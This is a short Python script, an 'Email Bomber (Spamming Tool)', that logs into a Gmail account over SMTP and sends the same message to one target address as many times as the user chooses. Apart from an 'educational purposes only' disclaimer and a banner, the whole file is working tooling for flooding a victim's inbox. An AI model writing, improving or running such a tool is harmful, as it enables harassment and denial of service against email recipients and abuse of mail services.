#!/usr/bin/python
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys
import time

print('                                                                    ')
print('                                                                    ')
print('            #################################################       ')
print('            #                                               #       ')
print('            #        Email Bomber ( Spamming Tool )         #       ')
print('            #                                               #       ')
print('            #                  Version 3.0                  #       ')
print('            #                                               #       ')
print('            #           Modified by : Fuad Hasan		       #       ')
print('            #                                               #       ')
print('            #       Only for Educational Purposes !!        #       ')
print('            #                                               #       ')
print('            #################################################       ')

print('                                                                   ')


print('                                           ')

print('    ')
email = input('Attacker Gmail Address : ')
print('             ')
user = input('Anonymous name : ')
print('      ')
passwd = input('Password: ')

print('   ')

to = input('\nTo: ')


print('    ')

body = input('Message: ')

print('    ')

total = int(input('Number of send: '))

smtp_server = 'smtp.gmail.com'
port = 587


print('')

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print ("\rE-mails sent: %i" % i)
        sys.stdout.flush()
    server.quit()
    print('\n Done !!!')
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('\n[!] The username or password you entered is incorrect.')
    sys.exit()
